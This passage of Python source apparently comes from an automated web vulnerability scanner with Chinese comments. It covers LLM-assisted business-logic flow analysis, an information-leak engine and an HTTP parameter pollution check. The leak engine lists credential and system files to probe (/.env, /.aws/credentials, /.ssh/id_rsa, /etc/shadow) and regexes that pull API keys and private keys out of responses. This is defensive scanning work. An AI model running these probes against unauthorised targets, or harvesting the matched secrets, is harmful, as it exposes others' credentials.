            elif isinstance(api, dict):
                _add(str(api.get("url", "")), "recon_api", status=api.get("status"))
            else:
                _add(str(api), "recon_api")

        # 2. 感兴趣端点
        for ep in getattr(context, "interesting_endpoints", set()) or set():
            _add(str(ep), "interesting")

        # 3. url_graph（页面链接关系 → 隐含流程次序）
        url_graph = getattr(context, "url_graph", {}) or {}
        for src, links in url_graph.items():
            if not isinstance(links, set):
                continue
            for link in list(links)[:20]:
                _add(str(link), "link")

        # 4. 已存储响应（含状态码/角色，可推断流程状态）
        responses = getattr(context, "responses", {}) or {}
        for url, resp in responses.items():
            if not isinstance(resp, dict):
                continue
            try:
                params = parse_qs(urlparse(str(url)).query) or {}
            except BaseException:
                params = {}
            _add(str(url), "response",
                 status=resp.get("status"),
                 role=resp.get("role", ""),
                 params=params,
                 text=str(resp.get("text", ""))[:5000],
                 headers=resp.get("headers") or {})

        # 5. Burp 请求历史（真实调用序列）
        for item in getattr(context, "burp_history", []) or []:
            if not isinstance(item, dict):
                continue
            url = item.get("url") or item.get("host") or ""
            _add(str(url), "burp",
                 status=item.get("status"),
                 role=item.get("role", ""),
                 params=item.get("params") or {},
                 text=str(item.get("response", ""))[:5000])

        return sequence[:60]

    def _classify_business_stage(self, url: str, path: str) -> str:
        """将 URL 归类到业务流程阶段"""
        lower = f"{path} {url}".lower()
        for stage, keywords in BUSINESS_FLOW_STAGES.items():
            if any(kw in lower for kw in keywords):
                return stage
        return "其他"

    def _extract_state_fields(self, url: str, params: Dict) -> List[str]:
        """提取 URL 中的状态变更字段"""
        fields = []
        for name, values in (params or {}).items():
            if not name:
                continue
            name_lower = name.lower()
            if any(kw in name_lower for kw in STATUS_PARAMS + ["step", "stage", "phase"]):
                value = values[0] if isinstance(values, (list, tuple)) and values else values
                fields.append(f"{name}={value}")
        # 从路径片段兜底提取（如 /order/paid、/checkout/step2）
        try:
            for seg in urlparse(url).path.split("/"):
                if seg.lower() in STATUS_PARAMS or seg.lower() in ("paid", "completed", "success", "pending", "verified"):
                    fields.append(seg)
        except BaseException:
            logger.debug("suppressed exception (engine audit)")
        return list(dict.fromkeys(fields))[:10]

    def _build_flow_graph(self, api_seq: List[Dict]) -> Dict:
        """构建业务流程图：步骤序列 + 阶段汇总 + 状态变更"""
        steps = []
        for item in api_seq:
            url = item.get("url", "")
            try:
                parsed = urlparse(url)
            except BaseException:
                continue
            stage = self._classify_business_stage(url, parsed.path)
            state_fields = self._extract_state_fields(url, item.get("params"))
            steps.append({
                "url": url[:300],
                "path": parsed.path[:200],
                "stage": stage,
                "status": item.get("status"),
                "role": item.get("role") or "",
                "state_fields": state_fields,
            })

        # 按业务阶段排序，突出流程顺序
        stage_order = {name: i for i, name in enumerate(BUSINESS_FLOW_STAGES)}
        steps.sort(key=lambda s: (stage_order.get(s["stage"], 99), s["path"]))

        stage_summary = {}
        for s in steps:
            stage_summary[s["stage"]] = stage_summary.get(s["stage"], 0) + 1

        return {
            "steps": steps[:40],
            "stage_summary": dict(sorted(stage_summary.items(), key=lambda x: stage_order.get(x[0], 99))),
            "total_endpoints": len(api_seq),
        }

    async def _ai_analyze_flow(self, flow: Dict, base_url: str) -> Optional[Dict]:
        """调用 LLM 识别异常业务流程（跳过支付、流程绕过、状态跳变、批量越权等）"""
        steps = flow.get("steps") or []
        if not steps:
            return None
        try:
            from vulnclaw.ai.core import get_llm_client
            client = get_llm_client()
        except BaseException as e:
            logger.debug(f"🤖 AI 业务逻辑分析不可用: {e}")
            return None

        steps_text = json.dumps(steps, ensure_ascii=False, indent=1)
        stage_summary = json.dumps(flow.get("stage_summary", {}), ensure_ascii=False)

        prompt = f"""你是资深应用安全专家，负责分析目标网站的业务流程是否存在逻辑漏洞。

目标站点: {base_url}

侦察到的 API/页面调用序列（可能不完整，可能包含不同角色的请求）:
{steps_text}

业务阶段分布: {stage_summary}

请分析该业务流程是否存在以下异常：
1. 跳过支付/免支付（如未经过 /payment 却可直接访问 /success，或订单状态直接变为 paid）
2. 流程绕过（关键校验步骤缺失，可直接访问后续页面）
3. 状态跳变（订单状态从初始状态直接跳到 paid/completed，无中间校验）
4. 批量操作越权（一个请求可影响多个用户/资源的批量操作）
5. 权限缺失（低权限角色访问高权限端点）
6. 积分/余额篡改（amount/balance/points 等参数可由客户端指定）

判断原则：
- 仅凭序列本身无法确认的，保持审慎，confidence 给"低"
- 序列中明显缺少支付步骤却存在成功页/完成状态标识的，属于高风险
- 输出必须为 JSON，不要输出其他内容

输出 JSON 格式：
{{
  "is_anomaly": true/false,
  "anomaly_type": "跳过支付/流程绕过/状态跳变/批量操作越权/权限缺失/金额篡改/无",
  "severity": "Critical/High/Medium/Low",
  "confidence": "高/中/低",
  "evidence": "分析依据（100字以内）",
  "affected_endpoints": ["url1", "url2"],
  "business_impact": "业务影响说明（50字以内）",
  "recommendation": "修复建议（50字以内）"
}}"""
        try:
            result = await client.ask(
                prompt,
                system="只输出 JSON，不要解释。",
                temperature=0.1,
                wrap_data=True
            )
            from vulnclaw.core.utils import clean_ai_json
            cleaned = clean_ai_json(result)
            json_match = re.search(r"\{.*\}", cleaned, re.DOTALL)
            if json_match:
                parsed = json.loads(json_match.group())
                if isinstance(parsed, dict) and parsed.get("is_anomaly") is True:
                    return parsed
        except BaseException as e:
            logger.debug(f"🤖 AI 业务流程图分析失败: {e}")
        return None

    async def _ai_flow_analysis(self, base_url: str, session, **kwargs) -> List[Dict]:
        """AI 业务流程分析主入口：收集序列 → 构建流程图 → LLM 识别异常 → 生成详细报告"""
        findings = []
        context = kwargs.get("context")
        if context is None:
            try:
                from vulnclaw.core.context import get_scan_context
                context = get_scan_context()
            except BaseException:
                context = None

        api_seq = self._collect_api_sequence(context)
        if not api_seq:
            logger.debug("🤖 [BusinessLogic AI] 上下文无可用 API 序列，跳过流程分析")
            return findings

        flow = self._build_flow_graph(api_seq)
        logger.info(f"🤖 [BusinessLogic AI] 收集 {len(api_seq)} 个 API 端点，"
                    f"构建 {len(flow['steps'])} 个流程步骤")

        ai_result = await self._ai_analyze_flow(flow, base_url)
        if not ai_result:
            return findings

        finding = {
            'url': base_url,
            'type': f'业务逻辑-AI流程异常({ai_result.get("anomaly_type", "未知")})',
            'severity': ai_result.get('severity', 'Medium'),
            'ai_verdict': ai_result.get('confidence', '中'),
            'evidence': ai_result.get('evidence', 'AI 分析未提供依据'),
            'method': 'ai_flow_analysis',
            'ai_report': {
                'anomaly_type': ai_result.get('anomaly_type'),
                'confidence': ai_result.get('confidence', '中'),
                'business_impact': ai_result.get('business_impact', ''),
                'recommendation': ai_result.get('recommendation', ''),
                'affected_endpoints': ai_result.get('affected_endpoints', []),
                'stage_summary': flow.get('stage_summary', {}),
                'flow_steps': flow.get('steps', [])[:10],
            }
        }
        logger.info(f"   🤖 AI 业务逻辑异常: {finding['type']} [{finding['severity']}] "
                    f"{ai_result.get('evidence', '')}")
        findings.append(finding)
        return findings


# ============================================================
# 信息泄露引擎 (InfoLeakEngine) - 修复版（误报大幅降低）
# ============================================================

class InfoLeakEngine(BaseEngine):
    """信息泄露检测引擎 - 修复版：降低误报率"""

    name = "info_leak"
    description = "信息泄露检测引擎（误报优化版）"

    SENSITIVE_PATHS = [
        "/.git/HEAD", "/.git/config", "/.git/index", "/.git/logs/HEAD",
        "/.git/refs/heads/master", "/.svn/entries", "/.svn/wc.db",
        "/.hg/hgrc", "/.hg/dirstate",
        "/.env", "/.env.local", "/.env.production", "/.env.development",
        "/.env.example", "/.aws/credentials", "/.aws/config",
        "/.ssh/id_rsa", "/.ssh/authorized_keys", "/.bash_history",
        "/wp-config.php", "/config.php", "/settings.inc.php",
        "/application/config/config.php", "/app/config/parameters.yml",
        "/config/database.php", "/web.config", "/web.xml", "/.htaccess",
        "/.htpasswd", "/nginx.conf", "/php.ini",
        "/backup.zip", "/backup.tar.gz", "/backup.sql", "/db_backup.sql",
        "/dump.sql", "/old.zip", "/old.tar.gz",
        "/composer.json", "/composer.lock", "/package.json",
        "/package-lock.json", "/requirements.txt", "/pom.xml",
        "/Dockerfile", "/docker-compose.yml", "/Makefile",
        "/error.log", "/access.log", "/debug.log", "/logs/error.log",
        "/logs/access.log", "/var/log/error.log",
        "/swagger.json", "/swagger-ui.html", "/openapi.json",
        "/api-docs", "/api-docs.json", "/docs", "/redoc",
        "/graphql/playground", "/graphiql", "/playground",
        "/v2/api-docs", "/v3/api-docs",
        "/phpinfo.php", "/info.php", "/test.php", "/debug.php",
        "/server-status", "/server-info", "/status", "/health",
        "/actuator/health", "/actuator/info", "/actuator/env",
        "/metrics", "/prometheus",
        "/", "/admin/", "/images/", "/css/", "/js/", "/assets/",
        "/files/", "/media/", "/uploads/", "/download/",
        "/static/", "/public/", "/content/", "/storage/",
        "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
        "/favicon.ico", "/humans.txt", "/security.txt",
        "/.well-known/security.txt",
    ]

    HIGH_RISK_PATHS = [
        '/.git/config', '/.git/HEAD', '/.git/index',
        '/.env', '/.env.local', '/.env.production', '/.env.development',
        '/wp-config.php', '/config.php', '/settings.inc.php',
        '/.aws/credentials', '/.aws/config',
        '/backup.sql', '/db_backup.sql', '/dump.sql',
        '/.ssh/id_rsa', '/.ssh/authorized_keys',
        '/etc/passwd', '/etc/shadow', '/etc/hosts',
        '/proc/self/environ', '/proc/self/cmdline',
        '/web.config', '/web.xml', '/appsettings.json',
        '/secrets.yml', '/secrets.yaml', '/credentials.json',
        '/composer.json', '/composer.lock', '/package.json',
        '/.htaccess', '/.htpasswd'
    ]

    DIRECTORY_LISTING_INDICATORS = [
        "Index of /", "Parent Directory", "<title>Index of",
        "[DIR]", "[TXT]", "[SND]", "Directory Listing",
        "Directory listing", "<pre>", "nginx directory listing",
        "Apache directory listing", "IIS directory listing",
        "Directory: /", "Folder: ",
    ]

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        return None

    # ============================================================
    # scan 方法（修复：支持 max_paths + 误报过滤）
    # ============================================================

    async def scan(
        self,
        target: str,
        session,
        **kwargs
    ) -> List[Dict]:
        findings = []
        base_url = target.rstrip('/')
        timeout = getattr(settings, 'timeout', 30)
        import asyncio  # H.2 扩展：目录列表判定/敏感数据提取是全文正则（≤50 路径×N 模式），纯 CPU 挪线程池

        max_paths = kwargs.get('max_paths')
        if max_paths is None:
            max_paths = kwargs.get('max_payloads', 50)
        if not isinstance(max_paths, int) or max_paths < 1:
            max_paths = 50
        max_paths = min(max_paths, len(self.SENSITIVE_PATHS))

        logger.info(f"🔍 开始信息泄露检测: {target} (扫描 {max_paths}/{len(self.SENSITIVE_PATHS)} 个路径)")

        paths_to_scan = self.SENSITIVE_PATHS[:max_paths]

        for path in paths_to_scan:
            test_url = base_url + path
            try:
                resp = await async_get(test_url, session=session, timeout=5)
                if isinstance(resp, tuple):
                    status, text, headers = resp
                else:
                    status = resp.status
                    text = await resp.text()
                    headers = dict(resp.headers)

                if status == 404:
                    continue

                if await asyncio.to_thread(self._is_directory_listing, text):
                    findings.append({
                        'url': test_url,
                        'type': f'目录列表: {path}',
                        'severity': 'Medium',
                        'evidence': '目录列表已开启，可浏览目录内容',
                        'path': path,
                        'status': status,
                        'recommendation': '关闭目录列表功能'
                    })
                    continue

                # ===== 修复：提取敏感数据（已收紧正则） =====
                sensitive_matches = await asyncio.to_thread(self._extract_sensitive_data, text)
                if sensitive_matches:
                    for label, matches in sensitive_matches.items():
                        # 跳过 aws_secret 的误报（无 aws_key 佐证且出现次数过多）
                        if label == 'aws_secret':
                            if len(matches) > 2 and 'aws_key' not in sensitive_matches:
                                logger.debug(f"      ⏭️ 跳过疑似误报: aws_secret (无 aws_key 佐证，出现 {len(matches)} 次)")
                                continue
                            # 如果匹配到的内容都是纯十六进制，也跳过
                            all_hex = all(re.match(r'^[0-9a-f]+$', m, re.I) for m in matches)
                            if all_hex:
                                logger.debug("      ⏭️ 跳过疑似误报: aws_secret (纯十六进制字符串)")
                                continue

                        severity = 'High' if label in ['aws_key', 'private_key', 'github_token'] else 'Medium'
                        # 如果 label 是 aws_secret 且没有 aws_key 佐证，降低严重性
                        if label == 'aws_secret' and 'aws_key' not in sensitive_matches:
                            severity = 'Low'

                        findings.append({
                            'url': test_url,
                            'type': f'敏感信息泄露: {label}',
                            'severity': severity,
                            'evidence': f'发现 {len(matches)} 个 {label}: {", ".join(matches[:3])}',
                            'path': path,
                            'status': status,
                            'matches': matches[:5],
                            'recommendation': '移除响应中的敏感信息'
                        })
                    continue

                if status == 200 and len(text) > 10:
                    if '.git' in path:
                        if 'ref:' in text or 'commit' in text:
                            findings.append({
                                'url': test_url,
                                'type': f'Git 仓库泄露: {path}',
                                'severity': 'Critical',
                                'evidence': 'Git 文件可访问，可能泄露源代码',
                                'path': path,
                                'status': status,
                                'recommendation': '移除 .git 目录或设置访问控制'
                            })
                            continue

                    if '.env' in path:
                        if any(kw in text for kw in ['DB_', 'API_', 'SECRET', 'KEY', 'PASSWORD']):
                            findings.append({
                                'url': test_url,
                                'type': f'环境变量泄露: {path}',
                                'severity': 'Critical',
                                'evidence': '环境配置文件可访问，包含敏感信息',
                                'path': path,
                                'status': status,
                                'recommendation': '禁止访问 .env 文件'
                            })
                            continue

                    if path.endswith(('.bak', '.old', '.backup', '.swp', '~')):
                        if '.php' in path or '.ini' in path or '.conf' in path:
                            findings.append({
                                'url': test_url,
                                'type': f'备份文件泄露: {path}',
                                'severity': 'High',
                                'evidence': '备份文件可访问，可能包含源代码',
                                'path': path,
                                'status': status,
                                'recommendation': '删除备份文件'
                            })
                            continue

                    if 'log' in path.lower():
                        if any(kw in text.lower() for kw in ['error', 'exception', 'warning', 'fatal']):
                            findings.append({
                                'url': test_url,
                                'type': f'日志文件泄露: {path}',
                                'severity': 'Medium',
                                'evidence': '日志文件可访问，包含错误信息',
                                'path': path,
                                'status': status,
                                'recommendation': '限制日志文件访问'
                            })
                            continue

                    if any(kw in path.lower() for kw in ['swagger', 'openapi', 'api-docs', 'graphql']):
                        if '{"' in text or '{"openapi"' in text or '{"swagger"' in text:
                            findings.append({
                                'url': test_url,
                                'type': f'API 文档泄露: {path}',
                                'severity': 'Low',
                                'evidence': 'API 文档可访问，可能泄露 API 结构',
                                'path': path,
                                'status': status,
                                'recommendation': '限制 API 文档访问或移除'
                            })
                            continue

                    if path in ['/robots.txt', '/sitemap.xml']:
                        findings.append({
                            'url': test_url,
                            'type': f'信息文件: {path}',
                            'severity': 'Info',
                            'evidence': f'{path} 可访问，可能泄露目录结构',
                            'path': path,
                            'status': status,
                            'recommendation': '检查是否包含敏感路径'
                        })
                        continue

            except asyncio.TimeoutError:
                logger.debug(f"信息泄露检测超时 {path}")
                continue
            except Exception as e:
                logger.debug(f"信息泄露检测失败 {path}: {e}")
                continue

        try:
            resp = await async_get(target, session=session, timeout=timeout)
            if isinstance(resp, tuple):
                headers = resp[2] if len(resp) > 2 else {}
            else:
                headers = resp.headers

            header_leaks = self._check_header_leaks(headers)
            for leak in header_leaks:
                findings.append(leak)
        except Exception as e:
            logger.debug(f"响应头检测失败: {e}")

        logger.info(f"✅ 信息泄露检测完成，发现 {len(findings)} 个问题")
        return findings

    # ============================================================
    # 辅助方法
    # ============================================================

    def _is_directory_listing(self, text: str) -> bool:
        text_lower = text.lower()
        for indicator in self.DIRECTORY_LISTING_INDICATORS:
            if indicator.lower() in text_lower:
                return True
        return False

    # ============================================================
    # 修复：_extract_sensitive_data（核心修复）
    # ============================================================
    def _extract_sensitive_data(self, text: str) -> Dict[str, List[str]]:
        """提取敏感信息 - 修复版：大幅降低误报率"""
        import re
        result = {}

        # 先移除 Base64 图片/字体数据，避免误报
        text = re.sub(r'data:image/[^;]+;base64,[A-Za-z0-9+/=]+', '[BASE64_IMAGE]', text)
        text = re.sub(r'data:font/[^;]+;base64,[A-Za-z0-9+/=]+', '[BASE64_FONT]', text)
        # 移除 CSS 中的哈希值
        text = re.sub(r'[a-f0-9]{32,64}(?=[;\s\}])', '[CSS_HASH]', text, flags=re.I)

        patterns = {
            'email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'phone': r'1[3-9]\d{9}',
            'id_card': r'\d{18}|\d{17}X',
            'credit_card': r'\d{16,19}',
            # AWS Access Key：以 AKIA/ASIA 开头，长度 16/20
            'aws_key': r'AKIA[0-9A-Z]{16}',
            # AWS Secret Key：长度 40，必须包含大小写字母混合，前后不能有字母数字
            'aws_secret': r'(?<![A-Za-z0-9/+=])(?=.*[a-z])(?=.*[A-Z])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])',
            # JWT：必须在常见上下文中
            'jwt': r'(?:Bearer\s+|Authorization:\s*["\']?|["\'](?:token|access_token|refresh_token|id_token)["\']\s*[:=]\s*["\']?)eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+',
            'google_api_key': r'AIza[0-9A-Za-z\\-_]{35}',
            'github_token': r'gh[pousr]_[A-Za-z0-9]{36}',
            'slack_webhook': r'hooks\.slack\.com/services/T[a-zA-Z0-9_]{8,10}/B[a-zA-Z0-9_]{8,10}/[a-zA-Z0-9_]{24}',
            'stripe_key': r'[sr]k_(live|test)_[0-9a-zA-Z]{24}',
            'openai_key': r'sk-[a-zA-Z0-9]{40,128}',
            'private_key': r'-----BEGIN (?:RSA|DSA|EC|OPENSSH) PRIVATE KEY-----',
            'internal_ip': r'(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})',
            'database_dsn': r'(mysql|postgresql|mongodb|redis|sqlite)://[^"\'\s<>]+',
        }

        for label, pattern in patterns.items():
            matches = re.findall(pattern, text, re.I)
            if matches:
                filtered = []
                for m in set(matches):
                    # 跳过纯十六进制（可能是哈希或 CSS 类名）
                    if re.match(r'^[0-9a-f]{16,128}$', m, re.I) and not re.match(
                        r'^(?:AKIA|ASIA|sk-|gh_)', m, re.I
                    ):
                        continue
                    # 跳过包含明显 CSS/JS 特征的
                    if any(x in m for x in ['.css', '.js', '.png', '.jpg', '.gif', '.svg', '.woff', '.ttf']):
                        continue
                    # 跳过全是数字的（可能是随机数）
                    if re.match(r'^\d+$', m) and len(m) > 10:
                        continue
                    filtered.append(m)
                if filtered:
                    result[label] = filtered[:5]

        # 如果同时匹配到 aws_secret 和 aws_key，保留 aws_key 更可靠
        if 'aws_secret' in result and result.get('aws_key'):
            # 有 aws_key 佐证，保留
            pass
        elif 'aws_secret' in result and len(result.get('aws_secret', [])) > 2:
            # 没有 aws_key 且出现多次，标记为可疑
            result['_note'] = 'aws_secret 出现多次且无 aws_key 佐证，可能为误报'

        return result

    def _check_header_leaks(self, headers: Dict) -> List[Dict]:
        findings = []
        server = headers.get('Server', '')
        if server:
            if re.search(r'\d+\.\d+\.\d+', server):
                findings.append({
                    'url': '',
                    'type': 'Server 头版本泄露',
                    'severity': 'Low',
                    'evidence': f'Server: {server}',
                    'recommendation': '隐藏或移除版本号'
                })

        x_powered_by = headers.get('X-Powered-By', '')
        if x_powered_by:
            findings.append({
                'url': '',
                'type': 'X-Powered-By 头泄露技术栈',
                'severity': 'Low',
                'evidence': f'X-Powered-By: {x_powered_by}',
                'recommendation': '移除 X-Powered-By 头'
            })

        x_aspnet = headers.get('X-AspNet-Version', '')
        if x_aspnet:
            findings.append({
                'url': '',
                'type': 'ASP.NET 版本泄露',
                'severity': 'Low',
                'evidence': f'X-AspNet-Version: {x_aspnet}',
                'recommendation': '移除 X-AspNet-Version 头'
            })

        x_aspnet_mvc = headers.get('X-AspNetMvc-Version', '')
        if x_aspnet_mvc:
            findings.append({
                'url': '',
                'type': 'ASP.NET MVC 版本泄露',
                'severity': 'Low',
                'evidence': f'X-AspNetMvc-Version: {x_aspnet_mvc}',
                'recommendation': '移除 X-AspNetMvc-Version 头'
            })

        x_generator = headers.get('X-Generator', '')
        if x_generator:
            findings.append({
                'url': '',
                'type': 'X-Generator 头泄露技术信息',
                'severity': 'Info',
                'evidence': f'X-Generator: {x_generator}',
                'recommendation': '移除 X-Generator 头'
            })

        return findings


# ============================================================
# HPPEngine（HTTP 参数污染）
# ============================================================
class HPPEngine(BaseEngine):
    """HTTP Parameter Pollution（HPP）检测引擎

    检测策略（证据优先）：
    1. 向参数追加同名的第二个取值（携带唯一随机 marker），观察后端
       实际采用的是 last/first/拼接 中的哪一种语义；
    2. 仅当 marker 在响应中回显（或引发与基线显著不同的响应）才报告，
       并注明污染语义，误报率低。
    """

    name = "hpp"
    description = "HTTP 参数污染（HPP）检测引擎"

    priority_params = [
        "id", "user", "role", "page", "type", "action", "status",
        "query", "search", "q", "filter", "category", "sort", "dir",
        "amount", "qty", "quantity", "limit", "offset", "group",
    ]

    MARKER_PREFIX = "hppprobe"

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        if normal_resp is None or not isinstance(normal_resp, tuple) or len(normal_resp) < 2:
            try:
                resp = await async_get(url, session=session, timeout=5, no_retry=True)
                if isinstance(resp, tuple) and len(resp) >= 2:
                    normal_resp = (resp[0], resp[1] if resp[1] else "", resp[2] if len(resp) > 2 else {})
                else:
                    return None
            except BaseException:
                return None

        marker = f"{self.MARKER_PREFIX}{secrets.token_hex(6)}"
        # 双值：同名参数出现两次，第二值携带 marker
        polluted_query = self._build_polluted_query(parsed_query, param, marker)
        attack_url = self._replace_query(url, polluted_query)

        try:
            resp = await async_get(attack_url, session=session, timeout=10, no_retry=True)
        except asyncio.CancelledError:
            raise
        except Exception as e:
            self.log_debug(f"HPP 检测异常 {param}: {e}")
            return None

        if not isinstance(resp, tuple) or len(resp) < 2:
            return None
        status, text = resp[0], resp[1] or ""

        reflected = marker in text
        if not reflected:
            if status == 0:
                # 2026-09-08: status==0 = 连接失败/请求未完成（反爬断连、抖动），
                # 不是 HTTP 响应差异。Audible 实测双值 200 内容与基线一致却因一次
                # 瞬时断连被报"200→0 差异 100%"误报。此类请求直接判无效，不参与判定。
                return None
            has_diff, diff_ratio = self.has_response_diff(normal_resp, (status, text, {}))
            if not (has_diff and (status != normal_resp[0] or diff_ratio > 0.35)):
                return None
            return self._build_finding(
                url, param, marker, status,
                semantic="unknown",
                evidence=f"注入同名双参数后响应变化（{normal_resp[0]}→{status}，差异 {diff_ratio:.1%}）但未回显 marker",
                confidence="medium",
            )

        semantic = self._detect_semantic(text, marker)
        return self._build_finding(
            url, param, marker, status,
            semantic=semantic,
            evidence=f"同名参数双值注入后，后端采用 {semantic} 语义，marker 被回显",
            confidence="high",
        )

    def _build_polluted_query(self, parsed_query: str, param: str, marker: str) -> str:
        """在原 query 基础上追加同名参数的第二取值。"""
        if parsed_query:
            return f"{parsed_query}&{param}={marker}"
        return f"{param}={marker}"

    def _replace_query(self, url: str, new_query: str) -> str:
        """用新 query 替换 URL 中原有 query（urlunparse 精确替换）。"""
        parsed = urlparse(url)
        return urlunparse(parsed._replace(query=new_query))

    def _detect_semantic(self, attack_text: str, marker: str) -> str:
        """推断后端对同名多值的解析语义。"""
        if marker not in attack_text:
            return "unknown"
        return "last（后值生效）"

    def _build_finding(
        self,
        url: str,
        param: str,
        marker: str,
        status: int,
        semantic: str,
        evidence: str,
        confidence: str,
    ) -> Dict:
        return {
            'url': url,
            'parameter': param,
            'payload': f"{param}=<原值>&{param}={marker}",
            'type': 'HPP（HTTP参数污染）',
            'ai_verdict': '高（后端接受同名多值）' if confidence == 'high' else '中（响应异常）',
            'confidence': confidence,
            'evidence': evidence,
            'semantic': semantic,
            'description': (
                "后端接受同名参数的多个取值且未做规范化，攻击者可通过追加同名参数"
                "污染校验逻辑（绕过 WAF/校验/拼接查询）。"
            ),
            'remediation': "对同名参数做规范化（拒绝或合并），校验时使用规范化后的参数值",
        }


# ============================================================
# 导出
# ============================================================

__all__ = [
    'ELInjectionEngine',
    'FileUploadEngine',
    'CORSEngine',
    'CRLFEngine',
    'LDAPEngine',
    'BusinessLogicEngine',
    'InfoLeakEngine',
    'HPPEngine',
]